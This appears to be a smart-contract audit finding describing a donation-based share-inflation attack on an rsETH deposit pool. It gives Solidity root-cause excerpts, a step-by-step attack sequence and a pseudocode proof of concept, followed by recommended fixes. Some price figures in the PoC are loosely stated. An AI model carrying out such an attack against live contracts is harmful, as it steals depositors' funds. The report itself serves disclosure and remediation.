### Title
Malicious Early Depositor Can Inflate rsETH Price via ETH Donation to Steal Subsequent Depositors' Funds - (File: contracts/LRTDepositPool.sol, contracts/LRTOracle.sol)

### Summary
The `LRTDepositPool` contract exposes an open `receive()` function that accepts arbitrary ETH donations. Because `getETHDistributionData()` uses `address(this).balance` directly as `ethLyingInDepositPool`, any donated ETH is immediately counted as protocol TVL. `LRTOracle._updateRsETHPrice()` then computes `rsETHPrice = totalETHInProtocol / rsethSupply`. A malicious early depositor can exploit this to inflate `rsETHPrice` before a victim deposits, causing the victim to receive 0 rsETH due to integer division truncation, while the attacker redeems their minimal rsETH position at the inflated price and recovers both their donation and the victim's deposit.

### Finding Description

**Root cause — `LRTDepositPool.sol`:**

```solidity
receive() external payable { }
``` [1](#0-0) 

**Root cause — `LRTDepositPool.getETHDistributionData()`:**

```solidity
ethLyingInDepositPool = address(this).balance;
``` [2](#0-1) 

This means any ETH sent directly to the contract (without minting rsETH) is counted as protocol TVL.

**Root cause — `LRTOracle._updateRsETHPrice()`:**

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
``` [3](#0-2) 

The price is a pure ratio of total ETH to total rsETH supply. A donation that increases the numerator without increasing the denominator directly inflates `rsETHPrice`.

**Root cause — `LRTDepositPool.getRsETHAmountToMint()`:**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [4](#0-3) 

If `rsETHPrice` has been inflated to `X * 1e18` and the victim deposits `Y` ETH where `Y < X`, integer division yields `rsethAmountToMint = 0`. The victim's ETH is accepted by the contract but they receive no rsETH.

**Attack sequence:**

1. `updateRSETHPrice()` is called (permissionless) → `rsETHPrice = 1e18` (supply is 0).
2. Attacker deposits `1 wei` ETH → receives `1 wei` rsETH.
3. Attacker sends `X` ETH directly to `LRTDepositPool` via `receive()`.
4. Attacker calls `updateRSETHPrice()` → `rsETHPrice ≈ X * 1e18`.
5. Victim deposits `Y` ETH (`Y < X`, `minRSETHAmountExpected = 0`) → `rsethAmountToMint = Y / X = 0`. Victim's `Y` ETH is absorbed into the protocol; victim receives nothing.
6. `updateRSETHPrice()` is called → `rsETHPrice ≈ (X + Y) * 1e18`.
7. Attacker calls `initiateWithdrawal(ETH, 1 wei rsETH)` → `expectedAssetAmount = 1 * (X + Y) * 1e18 / 1e18 = X + Y` ETH.
8. After the withdrawal delay, attacker recovers `X + Y` ETH.

**Net result:** Attacker started with `1 wei + X` ETH, ends with `X + Y` ETH. Net profit = `Y` ETH (the victim's entire deposit).

The `pricePercentageLimit` guard:
```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
``` [5](#0-4) 

defaults to `0` (disabled) since `pricePercentageLimit` is never set in `initialize()`. Even when set, the attacker can bypass it by donating gradually across multiple days, each time staying within the daily threshold, until the price is high enough to cause victim rounding to zero.

### Impact Explanation
**Critical — direct theft of user funds.** A victim who deposits ETH with `minRSETHAmountExpected = 0` (the default for many integrations and naive users) receives 0 rsETH while their ETH is permanently captured by the attacker. The attacker redeems their 1-wei rsETH position at the inflated price and recovers both the donation and the victim's deposit.

### Likelihood Explanation
**Low.** The attack is most effective when rsETH total supply is near zero (new deployment or very early stage). The attacker must donate more ETH than the victim deposits, and the victim must omit slippage protection. The protocol is already live with significant TVL, making the "near-zero supply" precondition harder to achieve in practice. However, any new deployment, upgrade-triggered reinitialization, or scenario where supply is artificially low reactivates the risk. The `pricePercentageLimit` being `0` by default removes the primary on-chain guard.

### Recommendation
1. **Require a minimum initial deposit / dead shares:** Mint a non-trivial amount of rsETH to a dead address on first deposit (or during initialization) so the supply is never near zero for an attacker to exploit.
2. **Track deposited ETH separately from `address(this).balance`:** Replace `ethLyingInDepositPool = address(this).balance` with an explicit accounting variable that is only incremented on legitimate deposits, preventing donations from inflating TVL.
3. **Enforce `pricePercentageLimit` from deployment:** Set a non-zero `pricePercentageLimit` in `initialize()` rather than leaving it at `0`.
4. **Enforce non-zero `minRSETHAmountExpected`:** Add a protocol-level minimum (e.g., `minRSETHAmountExpected >= 1`) in `_beforeDeposit()` to prevent victims from silently receiving 0 rsETH.

### Proof of Concept

```solidity
// Pseudocode PoC
function test_inflation_attack() external {
    // Step 1: seed price
    lrtOracle.updateRSETHPrice(); // rsETHPrice = 1e18, supply = 0

    // Step 2: attacker deposits 1 wei
    lrtDepositPool.depositETH{value: 1}(0, ""); // mints 1 wei rsETH

    // Step 3: attacker donates 20 ETH directly
    (bool ok,) = address(lrtDepositPool).call{value: 20 ether}("");
    require(ok);

    // Step 4: inflate price
    lrtOracle.updateRSETHPrice(); // rsETHPrice ≈ 20e18

    // Step 5: victim deposits 10 ETH with no slippage guard
    vm.prank(victim);
    lrtDepositPool.depositETH{value: 10 ether}(0, ""); // rsethAmountToMint = 10e18 / 20e18 = 0 → victim gets 0 rsETH

    // Step 6: price now reflects victim's ETH too
    lrtOracle.updateRSETHPrice(); // rsETHPrice ≈ 30e18

    // Step 7: attacker withdraws 1 wei rsETH → receives ~30 ETH
    lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, 1, "");
    // ... wait delay ...
    lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "");
    // attacker balance: ~30 ETH (started with 20 ETH + 1 wei, stole victim's 10 ETH)
}
```
